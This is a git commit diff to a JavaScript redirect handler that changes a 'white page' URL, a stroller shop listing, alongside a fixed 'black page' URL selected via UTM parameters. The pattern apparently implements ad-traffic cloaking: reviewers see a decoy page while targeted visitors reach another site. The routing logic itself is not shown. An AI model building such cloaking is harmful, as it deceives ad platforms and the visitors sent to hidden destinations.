54acbbda0c74d9cc153a7d1f8ad5cd5780ef5e0a
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-10-06 23:58:06 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.babymarkt.com/at/p/babycab-buggy-mailand-olive-7492944/";
+    const whitePageURL = "https://www.moovershop.com/products/traditional-doll-stroller-light-blue";
     const blackPageURL = "https://nowhereheres.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
